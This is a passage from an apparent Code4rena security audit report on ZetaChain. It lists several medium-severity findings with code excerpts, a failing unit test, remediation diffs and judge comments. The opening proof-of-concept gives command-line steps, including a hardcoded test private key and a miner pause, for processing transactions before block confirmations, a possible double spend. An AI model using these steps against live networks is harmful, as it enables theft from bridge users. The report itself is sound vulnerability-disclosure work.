*   Attach to the administrative function of the ETH node. This can be done with the following commands:
        sudo docker exec -it geth /bin/sh
        geth attach ipc://tmp/geth.ipc 
*   Ensure that `cast` from Foundry and Zetacore are installed on the same machine. Otherwise, it's not feasible to do this fast enough. This may require porting keys from the observer to the main machine or installing `cast` on the zetacore0 observer.
*   Follow along in the [PoC video](https://www.youtube.com/watch?v=CQj6WoUuqzQ)

1.  Find the ETH TSS address. This can be found by grepping the `orchestrator` logs for `ETH Address`.

2.  Send Ether to the TSS address. We will do this with Cast using the following command.
    ```solidity
      cast send --value 1000007 <TSS ADDRESS> --private-key d87baf7bf6dc560a252596678c12e41f7d1682837f05b29d411bc3f78ae2c263
    ```

3.  Quickly after sending this, add the transaction to the tx queue. This can be done with the following command:
         zetacored tx crosschain add-to-in-tx-tracker 1337 <HASH> 1 --from `zetacored keys list --output json | jq '.[0].address' -r` --yes --fees 10000azeta --chain-id athens_101-1 

4.  Go to the terminal with the geth admin connection setup. Run `miner.stop()` as fast as possible. If this is done fast enough, a single mined block is enough. Notice that this has paused the chain. To check this, you can run `cast block-number` and notice that the block number does not change.

5.  Keep track of the amount of CCTXs being voted on. This can be done by calling the following command:
        zetacored query crosschain list-cctx -o json | jq '.CrossChainTx | length'

6.  Notice that the `length` increases by 1 over time, which is the CCTX we just sent. This should NOT happen because the block confirmation has not been met. If a reorganization occurred at this point then a double spend could occur later.

### Short Term Remediation

Respect the block confirmation limits on both Ethereum and Bitcoin for inbound transactions. Simply ensure that enough blocks have passed prior to acting on them.

This is done properly within the [ObserveTxIn](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L780) code but not in the InboundTracker code.

### Long Term Remediation

The code between the InboundTracker and ObserveTxIn does almost the exact same parsing. The only difference is that the InboundTracker is told which transactions to look at while the latter looks at all transactions. The original was safe but the newer code is not.

To prevent these sorts of issues in the future, try to *share* the code between the two locations. This way, security issues are not repeated over and over again.

**[lumtis (ZetaChain) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/326#issuecomment-1883822881):**
 > I would actually decrease the severity since it concerns malicious observer and doesn't seem trivial to execute.

**[0xean (Judge) decreased severity to Medium](https://github.com/code-423n4/2023-11-zetachain-findings/issues/326#issuecomment-1883976254)**

***

## [[M-28] UpdateSystemContract is not copying `gasPriceByChainId` state variable to the new upgraded which will halt ZRC20 token withdraw until system contract is updated accordingly](https://github.com/code-423n4/2023-11-zetachain-findings/issues/235)
*Submitted by [dontonka](https://github.com/code-423n4/2023-11-zetachain-findings/issues/235)*

<https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/protocol-contracts/contracts/zevm/ZRC20.sol#L241-L244> 

<https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/protocol-contracts/contracts/zevm/ZRC20.sol#L257> 

<https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/fungible/keeper/msg_server_update_system_contract.go#L38-L58>

Zeta protocol allow to update `SystemContract.sol` using `UpdateSystemContract` function which require Admin Group 2 access (so the highest access).

There is a problem in this function which I consider `Medium` severity as it doesn't update one key state variable `gasPriceByChainId` during the upgrade.

As shown in the code snippet below, it does update the two other state variable gasCoinZRC20ByChainId and gasZetaPoolByChainId by calling respectively **setGasCoinZRC20** and **setGasZetaPool**, but missing the call to `setGasPrice`.

```

         ...

    	foreignCoins := k.GetAllForeignCoins(ctx)
    	tmpCtx, commit := ctx.CacheContext()
    	for _, fcoin := range foreignCoins {
    		zrc20Addr := ethcommon.HexToAddress(fcoin.Zrc20ContractAddress)
    		if zrc20Addr == (ethcommon.Address{}) {
    			k.Logger(ctx).Error("invalid zrc20 contract address", "address", fcoin.Zrc20ContractAddress)
    			continue
    		}
    		_, err = k.CallEVM(tmpCtx, *zrc20ABI, types.ModuleAddressEVM, zrc20Addr, BigIntZero, nil, true, false, "updateSystemContractAddress", newSystemContractAddr)
    		if err != nil {
    			return nil, sdkerrors.Wrapf(types.ErrContractCall, "failed to call zrc20 contract method updateSystemContractAddress (%s)", err.Error())
    		}
    		if fcoin.CoinType == common.CoinType_Gas {
    			_, err = k.CallEVM(tmpCtx, *sysABI, types.ModuleAddressEVM, newSystemContractAddr, BigIntZero, nil, true, false, "setGasCoinZRC20", big.NewInt(fcoin.ForeignChainId), zrc20Addr)
    			if err != nil {
    				return nil, sdkerrors.Wrapf(types.ErrContractCall, "failed to call system contract method setGasCoinZRC20 (%s)", err.Error())
    			}
    			_, err = k.CallEVM(tmpCtx, *sysABI, types.ModuleAddressEVM, newSystemContractAddr, BigIntZero, nil, true, false, "setGasZetaPool", big.NewInt(fcoin.ForeignChainId), zrc20Addr)
    			if err != nil {
    				return nil, sdkerrors.Wrapf(types.ErrContractCall, "failed to call system contract method setGasZetaPool (%s)", err.Error())
    			}
    		}
    	}
        ...
```

### Impact

`UpdateSystemContract` doesn't update `gasPriceByChainId` state variable on the new system contract instance which will have a temporary and unexpected negative impact after a system contract update as `withdraw` on `all ZRC20` token will `revert`, so halted, until the situation is mitigated by Observers calling `GasPriceVoter` on all the supported chains.

### Proof of Concept

I added the following unit test inside `TestKeeper_UpdateSystemContract`, which confirm that `gasPriceByChainId` is not being copied on the new system contract, as the last line of the test fail because `require.Equal(t, big.NewInt(41), queryGasPrice(chainID1, contract))` since the amount returned is 0, instead of 41.

<details>

```
    	t.Run("can update the system contract including gas price XD", func(t *testing.T) {
    		k, ctx, sdkk, zk := keepertest.FungibleKeeper(t)
    		msgServer := keeper.NewMsgServerImpl(*k)
    		k.GetAuthKeeper().GetModuleAccount(ctx, types.ModuleName)
    		admin := sample.AccAddress()
    		setAdminPolicies(ctx, zk, admin, observertypes.Policy_Type_group2)

    		queryZRC20SystemContract := func(contract common.Address) string {
    			abi, err := zrc20.ZRC20MetaData.GetAbi()
    			require.NoError(t, err)
    			res, err := k.CallEVM(ctx, *abi, types.ModuleAddressEVM, contract, keeper.BigIntZero, nil, false, false, "SYSTEM_CONTRACT_ADDRESS")
    			require.NoError(t, err)
    			unpacked, err := abi.Unpack("SYSTEM_CONTRACT_ADDRESS", res.Ret)
    			require.NoError(t, err)
    			address, ok := unpacked[0].(common.Address)
    			require.True(t, ok)
    			return address.Hex()
    		}

    		queryGasPrice := func(chainID *big.Int, contract common.Address) *big.Int {
    			abi, err := systemcontract.SystemContractMetaData.GetAbi()
    			require.NoError(t, err)
    			res, err := k.CallEVM(ctx, *abi, types.ModuleAddressEVM, contract, keeper.BigIntZero, nil, false, false, "gasPriceByChainId", chainID)
    			require.NoError(t, err)
    			unpacked, err := abi.Unpack("gasPriceByChainId", res.Ret)
    			require.NoError(t, err)
    			gasPrice, ok := unpacked[0].(*big.Int)
    			require.True(t, ok)
    			return gasPrice
    		}

    		verifyState := func(contract common.Address, chainID1, chainID2 *big.Int, gas1, gas2 common.Address) {
    			foundGas1, err := k.QuerySystemContractGasCoinZRC20(ctx, chainID1)
    			require.NoError(t, err)
    			require.Equal(t, gas1, foundGas1)
    			foundGas2, err := k.QuerySystemContractGasCoinZRC20(ctx, chainID2)
    			require.NoError(t, err)
    			require.Equal(t, gas2, foundGas2)
    			require.Equal(t, contract.Hex(), queryZRC20SystemContract(gas1))
    			require.Equal(t, contract.Hex(), queryZRC20SystemContract(gas2))
    			require.Equal(t, big.NewInt(41), queryGasPrice(chainID1, contract))
    			require.Equal(t, big.NewInt(52), queryGasPrice(chainID2, contract))
    		}

    		chains := zetacommon.DefaultChainsList()
    		require.True(t, len(chains) > 1)
    		require.NotNil(t, chains[0])
    		require.NotNil(t, chains[1])
    		chainID1 := chains[0].ChainId
    		chainID2 := chains[1].ChainId

    		wzeta, factory, router, _, oldSystemContract := deploySystemContracts(t, ctx, k, sdkk.EvmKeeper)
    		gas1 := setupGasCoin(t, ctx, k, sdkk.EvmKeeper, chainID1, "foo", "foo")
    		gas2 := setupGasCoin(t, ctx, k, sdkk.EvmKeeper, chainID2, "bar", "bar")

    		// setupGasCoin is not filling gasPriceByChainId, doing it manually as follow
    		k.SetGasPrice(ctx, big.NewInt(chainID1), big.NewInt(41))
    		k.SetGasPrice(ctx, big.NewInt(chainID2), big.NewInt(52))

    		// verify everything is good on the current system contract.
    		verifyState(oldSystemContract, big.NewInt(chainID1), big.NewInt(chainID2), gas1, gas2)

    		// deploy a new system contracts
    		newSystemContract, err := k.DeployContract(ctx, systemcontract.SystemContractMetaData, wzeta, factory, router)
    		require.NoError(t, err)
    		require.NotEqual(t, oldSystemContract, newSystemContract)

    		// can update the system contract
    		_, err = msgServer.UpdateSystemContract(ctx, types.NewMsgUpdateSystemContract(admin, newSystemContract.Hex()))
    		require.NoError(t, err)

    		// can retrieve the system contract
    		sc, found := k.GetSystemContract(ctx)
    		require.True(t, found)
    		require.Equal(t, newSystemContract.Hex(), sc.SystemContract)

    		// verify everything is good on the new system contract.
    		verifyState(newSystemContract, big.NewInt(chainID1), big.NewInt(chainID2), gas1, gas2)
    	})
```

</details>

### Test Output

    === RUN   TestKeeper_UpdateSystemContract
    --- FAIL: TestKeeper_UpdateSystemContract (0.07s)
    === RUN   TestKeeper_UpdateSystemContract/can_update_the_system_contract_including_gas_price_XD
        msg_server_update_system_contract_test.go:61: 
            	Error Trace:	/mnt/c/IX/GitProjects/platform-tools/ETH_course/C4/2023-11-zetachain/repos/node/x/fungible/keeper/msg_server_update_system_contract_test.go:61
            	            				/mnt/c/IX/GitProjects/platform-tools/ETH_course/C4/2023-11-zetachain/repos/node/x/fungible/keeper/msg_server_update_system_contract_test.go:98
            	Error:      	Not equal: 
            	            	expected: 41
            	            	actual  : 0
            	            	
            	            	Diff:
            	            	--- Expected
            	            	+++ Actual
            	            	@@ -2,4 +2,3 @@
            	            	  neg: (bool) false,
            	            	- abs: (big.nat) (len=1) {
            	            	-  (big.Word) 41
            	            	+ abs: (big.nat) {
            	            	  }
            	Test:       	TestKeeper_UpdateSystemContract/can_update_the_system_contract_including_gas_price_XD
        --- FAIL: TestKeeper_UpdateSystemContract/can_update_the_system_contract_including_gas_price_XD (0.07s)

Now that this is confirmed, if we examine [ZRC20::withdraw](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/protocol-contracts/contracts/zevm/ZRC20.sol#L257) it will first call `withdrawGasFee` which will then call `ISystem(SYSTEM_CONTRACT_ADDRESS).gasPriceByChainId(CHAIN_ID)` which will `return 0` as proven already by the unit test. As we can see after the condition will make this transaction revert as `gasPrice == 0`.

        function withdrawGasFee() public view override returns (address, uint256) {
            address gasZRC20 = ISystem(SYSTEM_CONTRACT_ADDRESS).gasCoinZRC20ByChainId(CHAIN_ID);
            if (gasZRC20 == address(0)) {
                revert ZeroGasCoin();
            }
            uint256 gasPrice = ISystem(SYSTEM_CONTRACT_ADDRESS).gasPriceByChainId(CHAIN_ID);
            if (gasPrice == 0) {
                revert ZeroGasPrice();
            }
            uint256 gasFee = gasPrice * GAS_LIMIT + PROTOCOL_FLAT_FEE;
            return (gasZRC20, gasFee);
        }

### Recommended Mitigation Steps

I would recommend to fix the problem in `UpdateSystemContract` to include `gasPriceByChainId` as follow. These changes will make the unit test pass.

<details>

```diff
func (k msgServer) UpdateSystemContract(goCtx context.Context, msg *types.MsgUpdateSystemContract) (*types.MsgUpdateSystemContractResponse, error) {
	ctx := sdk.UnwrapSDKContext(goCtx)
	if msg.Creator != k.observerKeeper.GetParams(ctx).GetAdminPolicyAccount(zetaObserverTypes.Policy_Type_group2) {
		return nil, sdkerrors.Wrap(sdkerrors.ErrUnauthorized, "Deploy can only be executed by the correct policy account")
	}
	newSystemContractAddr := ethcommon.HexToAddress(msg.NewSystemContractAddress)
	if newSystemContractAddr == (ethcommon.Address{}) {
		return nil, sdkerrors.Wrapf(sdkerrors.ErrInvalidAddress, "invalid system contract address (%s)", msg.NewSystemContractAddress)
	}

	// update contracts
	zrc20ABI, err := zrc20.ZRC20MetaData.GetAbi()
	if err != nil {
		return nil, sdkerrors.Wrapf(types.ErrABIGet, "failed to get zrc20 abi")
	}
	sysABI, err := systemcontract.SystemContractMetaData.GetAbi()
	if err != nil {
		return nil, sdkerrors.Wrapf(types.ErrABIGet, "failed to get system contract abi")
	}
+
+	sys, found := k.GetSystemContract(ctx)
+	if !found {
+		k.Logger(ctx).Error("system contract not found")
+	}
+	oldSystemContractAddress := sys.SystemContract
+	oldSystemContractAddr := ethcommon.HexToAddress(oldSystemContractAddress)
+	if oldSystemContractAddr == (ethcommon.Address{}) {
+		k.Logger(ctx).Error("invalid system contract address", "address", oldSystemContractAddress)
+		return nil, sdkerrors.Wrapf(types.ErrContractCall, "invalid system contract (%s)", err.Error())
+	}
+
	foreignCoins := k.GetAllForeignCoins(ctx)
	tmpCtx, commit := ctx.CacheContext()
	for _, fcoin := range foreignCoins {
		zrc20Addr := ethcommon.HexToAddress(fcoin.Zrc20ContractAddress)
		if zrc20Addr == (ethcommon.Address{}) {
			k.Logger(ctx).Error("invalid zrc20 contract address", "address", fcoin.Zrc20ContractAddress)
			continue
		}
		_, err = k.CallEVM(tmpCtx, *zrc20ABI, types.ModuleAddressEVM, zrc20Addr, BigIntZero, nil, true, false, "updateSystemContractAddress", newSystemContractAddr)
		if err != nil {
			return nil, sdkerrors.Wrapf(types.ErrContractCall, "failed to call zrc20 contract method updateSystemContractAddress (%s)", err.Error())
		}
		if fcoin.CoinType == common.CoinType_Gas {
			_, err = k.CallEVM(tmpCtx, *sysABI, types.ModuleAddressEVM, newSystemContractAddr, BigIntZero, nil, true, false, "setGasCoinZRC20", big.NewInt(fcoin.ForeignChainId), zrc20Addr)
			if err != nil {
				return nil, sdkerrors.Wrapf(types.ErrContractCall, "failed to call system contract method setGasCoinZRC20 (%s)", err.Error())
			}
			_, err = k.CallEVM(tmpCtx, *sysABI, types.ModuleAddressEVM, newSystemContractAddr, BigIntZero, nil, true, false, "setGasZetaPool", big.NewInt(fcoin.ForeignChainId), zrc20Addr)
			if err != nil {
				return nil, sdkerrors.Wrapf(types.ErrContractCall, "failed to call system contract method setGasZetaPool (%s)", err.Error())
			}
+
+			res, err := k.CallEVM(ctx, *sysABI, types.ModuleAddressEVM, oldSystemContractAddr, BigIntZero, nil, false, false, "gasPriceByChainId", big.NewInt(fcoin.ForeignChainId))
+			if err != nil {
+				return nil, sdkerrors.Wrapf(types.ErrContractCall, "failed to call system contract method gasPriceByChainId (%s)", err.Error())
+			}
+			unpacked, err := sysABI.Unpack("gasPriceByChainId", res.Ret)
+			if err != nil {
+				return nil, sdkerrors.Wrapf(types.ErrContractCall, "failed to unpack gasPriceByChainId response (%s)", err.Error())
+			}
+			gasPrice, ok := unpacked[0].(*big.Int)
+			if !ok {
+				return nil, sdkerrors.Wrapf(types.ErrContractCall, "failed to convert gasPriceByChainId response (%s)", err.Error())
+			}
+			_, err = k.CallEVM(tmpCtx, *sysABI, types.ModuleAddressEVM, newSystemContractAddr, BigIntZero, nil, true, false, "setGasPrice", big.NewInt(fcoin.ForeignChainId), gasPrice)
+			if err != nil {
+				return nil, sdkerrors.Wrapf(types.ErrContractCall, "failed to call system contract method setGasZetaPool (%s)", err.Error())
+			}
		}
	}

-       sys, found := k.GetSystemContract(ctx)
-       if !found {
-               k.Logger(ctx).Error("system contract not found")
-       }
-       oldSystemContractAddress := sys.SystemContract
	sys.SystemContract = newSystemContractAddr.Hex()
	k.SetSystemContract(ctx, sys)
	err = ctx.EventManager().EmitTypedEvent(
		&types.EventSystemContractUpdated{
			MsgTypeUrl:         sdk.MsgTypeURL(&types.MsgUpdateSystemContract{}),
			NewContractAddress: msg.NewSystemContractAddress,
			OldContractAddress: oldSystemContractAddress,
			Signer:             msg.Creator,
		},
	)
	if err != nil {
		k.Logger(ctx).Error("failed to emit event", "error", err.Error())
		return nil, sdkerrors.Wrapf(types.ErrEmitEvent, "failed to emit event (%s)", err.Error())
	}
	commit()
	return &types.MsgUpdateSystemContractResponse{}, nil
}
```
</details>

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/235#issuecomment-1876939031)**

***

## [[M-29] An already executed `InTxTracker` can still be added](https://github.com/code-423n4/2023-11-zetachain-findings/issues/218)
*Submitted by [zhaojie](https://github.com/code-423n4/2023-11-zetachain-findings/issues/218), also found by [MevSec](https://github.com/code-423n4/2023-11-zetachain-findings/issues/572) and [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/415)*

Anyone can add `InTxTracker` has been carried out, the node/observer will still deal with executive `InTxTracker`, Tx will not be repeated(The status of the vote has been changed and the vote cannot pass) ,but an attacker can cause network congestion.

### Proof of Concept

A new architecture use Permissionless Tx Validation Model, anyone can add an `InTxTracker`, but the `AddToInTxTracker` function does not verify that an `InTxTracker` has already been executed, so a Tx that has already been executed can be added again.
Since the executed Txs are normal Tx, they can be verified by proof and can be added by anyone.

The observer through `GetInboundTrackersForChain` access to all the `InTxTracker`, then parse the Tx content, then `MsgVoteOnObservedInboundTx` messages sent to a vote, after voting by creates CCTX, Finally execute `OutBoundTx`.

After the CCTX is created, the `InTxTracker` will be removed. If added again at this time, the observer still retrieves the Tx and creates a vote, since `VoteOnObservedInboundTx` uses `msg.Digest` as the index for voting, so duplicate messages cannot be voted, and eventually CCTX will not be created and will not be executed.

```go
func (k msgServer) VoteOnObservedInboundTx(....) {
    ....
	cctx := k.CreateNewCCTX(ctx, msg, index, tssPub, types.CctxStatus_PendingInbound, observationChain, receiverChain)
	defer func() {
		EmitEventInboundFinalized(ctx, &cctx)
		// #nosec G701 always positive
		cctx.InboundTxParams.InboundTxFinalizedZetaHeight = uint64(ctx.BlockHeight())
@>		k.RemoveInTxTrackerIfExists(ctx, cctx.InboundTxParams.SenderChainId, cctx.InboundTxParams.InboundTxObservedHash)
		k.SetCctxAndNonceToCctxAndInTxHashToCctx(ctx, cctx)
	}()
}
```

But here's the problem: `failing InTxTracker` are not deleted, `InTxTracker` is deleted after a `VoteOnObservedInboundTx` vote successfully creates a CCTX, but will not be deleted if a cctx is not created ,they are always available to observers, and they keep on executing and failing, causing congestion when there are a large number of these `invalid InTxTracker` on the network.

An attacker can add all the executed `InTxTracker` to the network and attack the network, which can make the network not work.

```go
func (k msgServer) AddToInTxTracker(goCtx context.Context, msg *types.MsgAddToInTxTracker) (*types.MsgAddToInTxTrackerResponse, error) {
	ctx := sdk.UnwrapSDKContext(goCtx)
	chain := k.zetaObserverKeeper.GetParams(ctx).GetChainFromChainID(msg.ChainId)
	if chain == nil {
		return nil, observertypes.ErrSupportedChains
	}

	adminPolicyAccount := k.zetaObserverKeeper.GetParams(ctx).GetAdminPolicyAccount(observertypes.Policy_Type_group1)
	isAdmin := msg.Creator == adminPolicyAccount
	isObserver := k.zetaObserverKeeper.IsAuthorized(ctx, msg.Creator, chain)

	isProven := false
	//@audit isObserver isAdmin does not verify proof if one is true
	if !(isAdmin || isObserver) && msg.Proof != nil {
		txBytes, err := k.VerifyProof(ctx, msg.Proof, msg.ChainId, msg.BlockHash, msg.TxIndex)
		if err != nil {
			return nil, types.ErrProofVerificationFail.Wrapf(err.Error())
		}

		if common.IsEVMChain(msg.ChainId) {
			err = k.VerifyEVMInTxBody(ctx, msg, txBytes)
			if err != nil {
				return nil, types.ErrTxBodyVerificationFail.Wrapf(err.Error())
			}
		} else {
			return nil, types.ErrTxBodyVerificationFail.Wrapf(fmt.Sprintf("cannot verify inTx body for chain %d", msg.ChainId))
		}
		isProven = true
	}

	// Sender needs to be either the admin policy account or an observer
	if !(isAdmin || isObserver || isProven) {
		return nil, errorsmod.Wrap(observertypes.ErrNotAuthorized, fmt.Sprintf("Creator %s", msg.Creator))
	}

    //@audit need to verify that InTxTracker has been executed

	k.SetInTxTracker(ctx, types.InTxTracker{
		ChainId:  msg.ChainId,
		TxHash:   msg.TxHash,
		CoinType: msg.CoinType,
	})
	return &types.MsgAddToInTxTrackerResponse{}, nil
}
```

### Tools Used

VScode

### Recommended Mitigation Steps

To verify that the InTxTracker has been executed.

**[DadeKuma (Lookout) commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/218#issuecomment-1866487495):**
 > Possible DoS with invalid transactions.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/218#issuecomment-1876932459)**

**[0xean (Judge) decreased severity to Medium commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/218#issuecomment-1880156263):**
 > > but an attacker can cause network congestion.
> 
> This does no qualify as H severity, it _might_ qualify to M severity assuming it could lead to a DOS.

***

## [[M-30] The `unwhitelist` function of `ERC20Custody` cannot be invoked.](https://github.com/code-423n4/2023-11-zetachain-findings/issues/195)
*Submitted by [p0wd3r](https://github.com/code-423n4/2023-11-zetachain-findings/issues/195)*

The `unwhitelist` function of `ERC20Custody` cannot be invoked,

### Proof of Concept

The `unwhitelist` function of `ERC20Custody` is supposed to be triggered by `SignWhitelistTx`, but `SignWhitelistTx` is not called anywhere else. Additionally, there is no test code in node specifically for `unwhitelist`.

<https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/evm_signer.go#L626-L633>

```go
// SignWhitelistTx
// function whitelist(
// address asset,
// ) external onlyTssAddress
// function unwhitelist(
// address asset,
// ) external onlyTssAddress
func (signer *EVMSigner) SignWhitelistTx(
```

```shell
# pwd node/zetaclient
grep -ri 'SignWhitelistTx' *.go

evm_signer.go:// SignWhitelistTx
evm_signer.go:func (signer *EVMSigner) SignWhitelistTx(
```

```shell
grep -ri 'unwhitelist' *.go

evm_signer.go:// function unwhitelist(
```

The `whitelist` function is actually called in `SignCommandTx`, but there is no call to `unwhitelist` within `SignCommandTx`.

<https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/evm_signer.go#L257-L278>

```go
func (signer *EVMSigner) SignCommandTx(
	cmd string,
	params string,
	to ethcommon.Address,
	outboundParams *types.OutboundTxParams,
	gasLimit uint64,
	gasPrice *big.Int,
	height uint64,
) (*ethtypes.Transaction, error) {
	if cmd == common.CmdWhitelistERC20 {
		erc20 := ethcommon.HexToAddress(params)
		if erc20 == (ethcommon.Address{}) {
			return nil, fmt.Errorf("SignCommandTx: invalid erc20 address %s", params)
		}
		custodyAbi, err := erc20custody.ERC20CustodyMetaData.GetAbi()
		if err != nil {
			return nil, err
		}
		data, err := custodyAbi.Pack("whitelist", erc20)
		if err != nil {
			return nil, err
		}
```

Ultimately, `unwhitelist` cannot be invoked through tss.

<https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/protocol-contracts/contracts/evm/ERC20Custody.sol#L153-L156>

```go
    function unwhitelist(IERC20 asset) external onlyTSS {
        whitelisted[asset] = false;
        emit Unwhitelisted(asset);
    }
```

### Tools Used

VScode

### Recommended Mitigation Steps

Add a call to `SignWhitelistTx`.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/195#issuecomment-1876919975)**

**[0xean (Judge) commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/195#issuecomment-1880176023):**
 > >  but the function of the protocol or its availability could be impacted
> 
> The impact here doesn't necessarily mean the M severity is warranted, however I think it does impact the "function of the protocol".

***

## [[M-31] When updating gas, if one chain fails, the others should continue to be updated instead of being skipped.](https://github.com/code-423n4/2023-11-zetachain-findings/issues/178)
*Submitted by [p0wd3r](https://github.com/code-423n4/2023-11-zetachain-findings/issues/178), also found by [oakcobalt](https://github.com/code-423n4/2023-11-zetachain-findings/issues/556), [dontonka](https://github.com/code-423n4/2023-11-zetachain-findings/issues/438), and [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/405)*

Due to an expected error occurring in one chain, the gas for the other chains cannot be updated.

### Proof of Concept

`IterateAndUpdateCctxGasPrice` is used to periodically update the `gas price` of `cctx`. It iterates through all `cctx` in all chains to update their `gas price`.

<https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/abci.go#L34-L53>

```go
	// iterate all chains' pending cctx
	chains := common.DefaultChainsList()
	for _, chain := range chains {
		res, err := k.CctxAllPending(sdk.UnwrapSDKContext(ctx), &types.QueryAllCctxPendingRequest{
			ChainId: chain.ChainId,
		})
		if err != nil {
			return err
		}

		// iterate through all pending cctx
		for _, pendingCctx := range res.CrossChainTx {
			if pendingCctx != nil {
				_, _, err := k.CheckAndUpdateCctxGasPrice(ctx, *pendingCctx, gasPriceIncreaseFlags)
				if err != nil {
					return err
				}
			}
		}
	}
```

One possible error that can be returned in `CheckAndUpdateCctxGasPrice` is insufficient balance in the `GasStabilityPool`.

<https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/abci.go#L107-L112>

```go
	if err := k.fungibleKeeper.WithdrawFromGasStabilityPool(ctx, chainID, additionalFees.BigInt()); err != nil {
		return math.ZeroUint(), math.ZeroUint(), cosmoserrors.Wrap(
			types.ErrNotEnoughFunds,
			fmt.Sprintf("cannot withdraw %s from gas stability pool", additionalFees.String()),
		)
	}
```

The `GasStabilityPool` is only replenished when an outbound transaction is finalized.

<https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_outbound_tx.go#L131-L136>

```go
	// Fund the gas stability pool with the remaining funds
	if err := k.FundGasStabilityPoolFromRemainingFees(ctx, *cctx.GetCurrentOutTxParam(), msg.OutTxChain); err != nil {
		log.Error().Msgf(
			"VoteOnObservedOutboundTx: CCTX: %s Can't fund the gas stability pool with remaining fees %s", cctx.Index, err.Error(),
		)
	}
```
Therefore, during the execution of `IterateAndUpdateCctxGasPrice`, outbound `cctx` may not have been finalized yet, leading to a possible scenario of insufficient balance in the `GasStabilityPool`, which is an expected occurrence. However, in the current implementation, if the `GasStabilityPool` of one chain is insufficient, the function directly returns, and the remaining chains in the loop are not processed. For other chains, the `GasStabilityPool` might be sufficient, and they should not be neglected.

### Tools Used

VScode

### Recommended Mitigation Steps

If `CheckAndUpdateCctxGasPrice` returns an error, skip the loop for that `cctx` and continue with the outer loop for the chain.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/178#issuecomment-1876906655)**

***

## [[M-32] `ZetaSupplyChecker` calculation error](https://github.com/code-423n4/2023-11-zetachain-findings/issues/177)
*Submitted by [p0wd3r](https://github.com/code-423n4/2023-11-zetachain-findings/issues/177), also found by [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/399)*

<https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/zeta_supply_checker.go#L153-L155> 

Due to the incorrect calculation of `AbortedTxAmount`, the result of `ZetaSupplyChecker` is erroneous.

### Proof of Concept

In `ZetaSupplyChecker`, to verify if the supply is correct, the following formula is used:

    eth locked + aborted amount == zeta supply on node + zeta in transit + external supply + genesis amount

The calculation for the `aborted amount` is as follows:

<https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/zeta_supply_checker.go#L177-L191>

```go
func (zs *ZetaSupplyChecker) AbortedTxAmount() (sdkmath.Int, error) {
	cctxList, err := zs.zetaClient.GetCctxByStatus(types.CctxStatus_Aborted)
	if err != nil {
		return sdkmath.ZeroInt(), err
	}
	amount := sdkmath.ZeroUint()
	for _, cctx := range cctxList {
		amount = amount.Add(cctx.GetCurrentOutTxParam().Amount)
	}
	amountInt, ok := sdkmath.NewIntFromString(amount.String())
	if !ok {
		return sdkmath.ZeroInt(), errors.New("error parsing amount")
	}
	return amountInt, nil
}
```

The problem arises here by directly taking `cctx.GetCurrentOutTxParam().Amount`, without determining whether the `coinType` of this `cctx` is ZETA.

When a revert cctx is created, `outParam.coinType` is set to `cctx.InboundTxParams.CoinType`, which can be gas or ERC20, and not necessarily ZETA.

<https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_inbound_tx.go#L157-L165>

```go
			// create new OutboundTxParams for the revert
			revertTxParams := &types.OutboundTxParams{
				Receiver:           cctx.InboundTxParams.Sender,
				ReceiverChainId:    cctx.InboundTxParams.SenderChainId,
				Amount:             cctx.InboundTxParams.Amount,
				CoinType:           cctx.InboundTxParams.CoinType,
				OutboundTxGasLimit: gasLimit,
			}
			cctx.OutboundTxParams = append(cctx.OutboundTxParams, revertTxParams)
```

If the revert `cctx` fails and turns into `aborted`, for example, in the following code snippet, then this non-ZETA `amount` will be recorded in `AbortedTxAmount`.

<https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_inbound_tx.go#L191-L203>

```go
				if cctx.InboundTxParams.CoinType == common.CoinType_ERC20 {

					if err := k.RefundAmountOnZetaChain(ctx, cctx, cctx.InboundTxParams.Amount); err != nil {
						// log the error
						k.Logger(ctx).Error("failed to refund amount of aborted cctx on ZetaChain",
							"error", err,
							"sender", cctx.InboundTxParams.Sender,
							"amount", cctx.InboundTxParams.Amount.String(),
						)
					}
				}

				cctx.CctxStatus.ChangeStatus(types.CctxStatus_Aborted, err.Error())
```

Therefore, the quantity returned by `AbortedTxAmount` is greater than the actual amount of ZETA.

### Tools Used

VScode

### Recommended Mitigation Steps

Ensure `coinType` is ZETA before recording the `amount`.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/177#issuecomment-1876885190)**

***

## [[M-33] Distribution module address can be used to halt chain breaking all functionality.](https://github.com/code-423n4/2023-11-zetachain-findings/issues/176)
*Submitted by [jayjonah8](https://github.com/code-423n4/2023-11-zetachain-findings/issues/176)*

Currently any account can send funds to the `distribution` module account breaking the crisis invariant and causing a complete consensus failure resulting in no new blocks being produced.

